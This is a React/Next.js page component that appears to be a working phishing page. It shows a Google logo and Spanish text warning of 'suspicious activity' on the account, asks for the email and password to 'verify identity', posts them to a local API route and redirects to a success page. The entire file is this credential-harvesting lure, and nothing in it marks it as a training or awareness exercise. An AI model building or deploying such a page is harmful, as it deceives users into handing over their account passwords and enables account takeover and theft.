import { FormEvent, useState } from "react";
import { CustomImage } from "./components/Image/image.component";
import { GOOGLE_IMAGE_CONSTANT } from "./config/constants/image.constants";
import { emailValidation } from "./config/validations/email.validation";
import { useForm } from "./hooks/useForm";
import { isNotEmptyValidation } from "./config/validations/not-empty.validation";
import axios from "axios";
import { useRouter } from "next/router";

const SecurePage = () => {
  const { email, password, verifyPassword, onChangeInput } = useForm({
    email: ["", [emailValidation]],
    password: ["", [isNotEmptyValidation]],
    verifyPassword: ["", [isNotEmptyValidation]],
  });
  const [errors, setErrors] = useState({ notMatchPassword: false });
  const router = useRouter();

  const onSubmit = ($event: FormEvent<HTMLFormElement>) => {
    $event.preventDefault();

    if (password.value !== verifyPassword.value) {
      setErrors({ ...errors, notMatchPassword: true });
      return;
    } else {
        setErrors({...errors, notMatchPassword: false});
    }

    axios
      .post(`/api/hello`, {
        email: email.value,
        password: password.value,
      })
      .then((res) => {
        const { ok, ...rest } = res.data;
        router.push('/success');
      });
  };

  return (
    <div className="container m-5">
      <div className="columns is-flex is-justify-content-center">
        <div className="image-header">
          <CustomImage url={GOOGLE_IMAGE_CONSTANT} style={{ width: "200px" }} />
        </div>
      </div>
      <div className="columns is-flex is-flex-direction-column has-text-centered m-5">
        <h1 className="title is-1 has-text-link">Bienvenido</h1>
        <p>
          Hemos notado actividad sospechosa en su cuenta, por favor, proporcione
          sus datos de acceso para verificar su identidad.
        </p>
      </div>
      <div className="columns">
        <form onSubmit={onSubmit} className="column m-5">
          <div className="field">
            <div className="label">Email</div>
            <input
              value={email.value}
              onChange={onChangeInput}
              type="text"
              name="email"
              className="input"
              placeholder="Ingresa tu correo electrónico"
            />
          </div>
          <div className="field">
            <div className="label">
              Contraseña
              {errors.notMatchPassword && (
                <span className="ml-1 tag is-danger">No coinciden las contraseñas</span>
              )}
            </div>
            <input
              value={password.value}
              onChange={onChangeInput}
              type="password"
              name="password"
              className="input"
              placeholder="Ingresa tu contraseña"
            />
          </div>
          <div className="field">
            <div className="label">
              Verificar contraseña{" "}
              {errors.notMatchPassword && (
                <span className="ml-1 tag is-danger">No coinciden las contraseñas</span>
              )}
            </div>
            <input
              value={verifyPassword.value}
              onChange={onChangeInput}
              type="password"
              name="verifyPassword"
              className="input"
              placeholder="Ingresa tu contraseña"
            />
          </div>
          <div className="field is-grouped is-grouped-right">
            <button type="submit" className="button is-info">
              Verificar
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default SecurePage;
